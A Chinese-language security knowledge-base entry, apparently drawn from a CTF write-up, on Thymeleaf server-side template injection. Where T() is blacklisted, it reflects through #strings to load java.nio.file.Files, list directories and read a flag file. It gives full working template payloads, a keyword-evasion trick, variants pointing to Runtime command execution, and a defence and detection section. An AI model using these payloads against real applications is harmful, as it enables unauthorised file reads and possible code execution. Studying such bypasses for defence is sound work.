---
id: web-java-expression-spel-thymeleaf-strings-reflection-file-read
title: Thymeleaf SSTI 禁用 T() 时用
type: scenario
domain: web
path: web/java/expression/spel
technique: thymeleaf-strings-reflection-files-read
tags:
- ssti
- thymeleaf
- java
- reflection
- file-read
- waf-bypass
- nio
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:35:15+08:00'
  notes: 已对照原文 Thymeleaf payload 与渲染截图核对；#strings 反射链与 readAllLines 结果一致；PoC 未复跑。
url: /docs/web/java/expression/spel/web-java-expression-spel-thymeleaf-strings-reflection-file-read/
draft: false
kb_aliases:
- Thymeleaf
- T() 黑名单绕过
- Thymeleaf 文件读取
- java.nio.file.Files
- null
- 模板注入读文件
---

## 一句话结论

当 Thymeleaf 模板注入点的 `T(...)` 被严格禁用时，可以用模板内置的 `#strings` 工具对象调用 `getClass()` 得到 `Class`，再经 `forName/getMethod/invoke` 反射加载 `java.nio.file.Files`，用 `Files.list` 列目录、`Files.readAllLines` 读文件；整条链不执行系统命令，仅靠模板表达式和 NIO 就能读出 flag。

## 原理

- **SSTI 入口**：后台“公告预览”把用户输入原样作为 Thymeleaf 模板渲染，`<span th:text="${7*7}">` 返回 `49`，`${now}` 返回当前时间，确认表达式会被求值。
- **`T(...)` 被拦**：直接使用 `T(java.lang.Runtime)`/`T(java.nio.file.Files)` 的类型令牌被黑名单拦截，因此需要找不需要 `T` 的类型访问方式。
- **`#strings` 作为反射桥**：`#strings` 是 Thymeleaf 表达式上下文中的 `org.thymeleaf.expression.Strings` 实例；`${#strings.getClass()}` 返回它的 `Class` 对象。`Class` 自带静态/实例方法 `forName(String)`、`getMethod(String, Class...)`、`invoke(Object, Object...)`，在 Thymeleaf/SpringEL 中可继续调用，从而绕过 `T` 关键字。
- **加载 NIO 类**：`#strings.getClass().forName('java.nio.file.Files')` 得到 `java.nio.file.Files` 的 `Class`；`getMethod('list', #strings.getClass().forName('java.nio.file.Path'))` 取得 `Files.list(Path)` 方法；`invoke(null, path)` 以静态方式调用。
- **构造 Path**：`#strings.getClass().forName('java.nio.file.Paths').getMethod('get', #strings.getClass().forName('java.lang.String'), #strings.getClass().forName('[Ljava.lang.String;')).invoke(null, '/', #strings.arraySplit('', ','))`。`Paths.get(String, String...)` 的第二个参数是 `String[]`；`#strings.arraySplit('', ',')` 生成空数组，满足可变参数签名。
- **列目录与读文件**：`Files.list(path).toArray()` 得到目录项数组，`#strings.arrayJoin(..., ', ')` 拼成字符串回显；`Files.readAllLines(path, StandardCharsets.UTF_8).toString()` 直接输出文件所有行。读取时把文件名拆成 `'/fl' + 'ag_y0u_d0nt_kn0w'`，避免 `flag` 关键字被额外规则命中。
- **为什么可行**：黑名单只盯 `T(`/`new` 这类显式类型令牌，而 Thymeleaf 的表达式对象（`#strings`）本身就是一个可调用 `getClass()` 的 Java 对象；`Class.forName` + `Method.invoke` 是标准反射 API，不需要 `T`。`java.nio.file.Files` 提供完整的文件系统能力，不需要 `Runtime.exec`，因此即使命令执行被禁也能读文件。

## 触发条件

- 应用把用户输入作为 Thymeleaf 模板/表达式渲染（`th:text`、`th:utext`、视图名、片段表达式等），且未使用受限求值上下文。
- `T(...)`/`new` 被黑名单或 `SpringStandardExpressionUtils` 拦截，但 `#strings` 等表达式工具对象仍可用，且反射方法调用未被禁。
- 目标 JDK 提供 `java.nio.file.Files`/`Paths`（Java 7+）。
- 模板输出会回显到响应中，便于读取目录列表和文件内容。
- 进程对目标文件有读权限。

## 利用步骤

1. 在预览/模板输入框提交 `${7*7}`，确认返回 `49`；再提交 `${#strings.getClass()}` 确认 `#strings` 可用。
2. 用 `Files.list` 列出根目录，定位 flag 文件名（本例为 `flag_y0u_d0nt_kn0w`）：
   ```text
   <span th:text="${#strings.arrayJoin(#strings.getClass().forName('java.nio.file.Files').getMethod('list', #strings.getClass().forName('java.nio.file.Path')).invoke(null, #strings.getClass().forName('java.nio.file.Paths').getMethod('get', #strings.getClass().forName('java.lang.String'), #strings.getClass().forName('[Ljava.lang.String;')).invoke(null, '/', #strings.arraySplit('', ','))).toArray(), ', ')}"></span>
   ```
3. 用 `Files.readAllLines` 读取目标文件；文件名用字符串拼接规避关键字：
   ```text
   <span th:text="${#strings.getClass().forName('java.nio.file.Files').getMethod('readAllLines', #strings.getClass().forName('java.nio.file.Path'), #strings.getClass().forName('java.nio.charset.Charset')).invoke(null, #strings.getClass().forName('java.nio.file.Paths').getMethod('get', #strings.getClass().forName('java.lang.String'), #strings.getClass().forName('[Ljava.lang.String;')).invoke(null, '/fl' + 'ag_y0u_d0nt_kn0w', #strings.arraySplit('', ','))), #strings.getClass().forName('java.nio.charset.StandardCharsets').getField('UTF_8').get(null)).toString()}"></span>
   ```
4. 从响应中读取 flag；若目录列表太长，可改 `Files.newDirectoryStream`、`Files.walk` 或直接读已知路径。
5. 若 `Files` 被拦，可换 `java.io.FileInputStream`、`java.util.Scanner`、`java.lang.Runtime` 等类，仍用同一 `#strings.getClass().forName(...)` 反射桥。

## PoC

```text
# 1) 确认表达式执行
${7*7}                         -> 49

# 2) 列根目录（关键片段）
#strings.getClass().forName('java.nio.file.Files')
  .getMethod('list', #strings.getClass().forName('java.nio.file.Path'))
  .invoke(null,
    #strings.getClass().forName('java.nio.file.Paths')
      .getMethod('get', #strings.getClass().forName('java.lang.String'),
                        #strings.getClass().forName('[Ljava.lang.String;'))
      .invoke(null, '/', #strings.arraySplit('', ',')))
  .toArray()

# 3) 读文件
#strings.getClass().forName('java.nio.file.Files')
  .getMethod('readAllLines',
    #strings.getClass().forName('java.nio.file.Path'),
    #strings.getClass().forName('java.nio.charset.Charset'))
  .invoke(null,
    ...Paths.get('/fl' + 'ag_y0u_d0nt_kn0w', #strings.arraySplit('', ',')),
    #strings.getClass().forName('java.nio.charset.StandardCharsets')
      .getField('UTF_8').get(null))
  .toString()
```

原文实测根目录列表包含 `/flag_y0u_d0nt_kn0w`，读取后返回 `flag{dd3a62b5-7038-4e60-bd64-76cde6e84b1c9}`。

## 变体与关联

- 变体：`#request`、`#response`、`#session`、`#servletContext` 等上下文对象也可作为 `getClass()` 的起点；不同 Thymeleaf 版本对象名略有差异。
- 变体：`Class.forName` 后可调用 `getDeclaredMethod`/`getDeclaredConstructor`/`newInstance` 构造任意对象；也可加载 `java.lang.Runtime` 执行命令（若反射未被限制）。
- 变体：若 `Files.readAllLines` 被关键字规则拦截，可用 `Files.newInputStream` + `java.util.Scanner`，或 `java.io.FileReader`/`BufferedReader`。
- 关联：[[web-java-expression-spel-ruoyi-thymeleaf-fragment-ssti]]（Thymeleaf 片段表达式与 `$$` 绕过）、[[web-java-expression-spel-restricted-reflection-memshell]]（`T()`/`new` 禁用时的反射链）、[[web-java-expression-spel-thymeleaf-viewname-preprocessing-ssti]]（视图名预处理 SSTI）。
- 边界：若模板使用 `SimpleEvaluationContext` 或禁用了方法调用/类型访问，本链不成立；`#strings` 在部分 Thymeleaf 3.1+ 受限上下文中可能不可用。

## 检测与防御

- **入口**：不要把用户输入作为 Thymeleaf 模板或片段表达式；预览功能使用固定模板 + 数据绑定，而不是动态模板字符串。
- **表达式上下文**：使用 `SimpleEvaluationContext`/受限 `EvaluationContext`，禁用类型访问、静态方法、Bean 引用与方法调用；关闭不必要的 `#strings` 等工具对象。
- **黑名单**：仅禁用 `T(`/`new` 不足以防反射；应同时拦截 `getClass`、`forName`、`getMethod`、`invoke`、`getDeclared*`、`java.nio.file`、`java.io` 等特征，并做语法级分析。
- **运行**：以低权限用户运行，限制文件读权限；对模板求值加沙箱/超时。
- **检测**：请求中出现 `#strings.getClass`、`forName`、`getMethod`、`Files.readAllLines`、`Paths.get`、`/fl' + 'ag` 等拼接；模板异常堆栈出现 `SpelExpression`/`Reflection`；响应中出现目录列表或文件内容。
